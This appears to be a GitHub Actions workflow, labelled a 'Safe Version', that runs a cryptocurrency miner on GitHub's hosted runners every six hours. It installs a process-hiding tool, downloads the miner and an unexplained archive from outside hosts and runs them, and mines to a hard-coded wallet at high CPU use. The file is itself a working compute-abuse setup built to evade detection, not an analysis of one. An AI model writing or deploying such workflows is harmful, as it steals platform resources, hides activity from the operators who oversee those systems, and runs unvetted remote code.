name: IXI Miner (Safe Version)

on:
  workflow_dispatch:  # Jalankan manual via GitHub UI
  schedule:
    - cron: '0 */6 * * *'  # Setiap 6 jam sekali (opsional)

jobs:
  mine:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # Batas waktu 6 jam

    steps:
    - name: Install dependencies
      run: |
        sudo apt update -y
        sudo apt install -y binutils cmake build-essential screen unzip net-tools curl wget gcc libssl-dev

        curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
        sudo apt-get install -y nodejs nodejs-dev node-gyp npm
        npm install -g node-process-hider

    - name: Download & Extract IXI Miner
      run: |
        wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz
        tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz
        cd iximiner_v0.3.0_22.08.2022_linux

        wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
        tar -xvzf graphics.tar.gz

    - name: Start Mining
      run: |
        cd iximiner_v0.3.0_22.08.2022_linux
        chmod +x iximiner
        ./iximiner --mode miner \
          --pool https://ixi.hash.express \
          --wallet 5EYh6f2nawaGiJrna19sU7LMBv2Z7AHQqsDfUTgdJf2163seFXwdoEBfqJrnJ55Pp \
          --name ${{ github.run_id }}-safe \
          --cpu-intensity 80 \
          --gpu-intensity 0
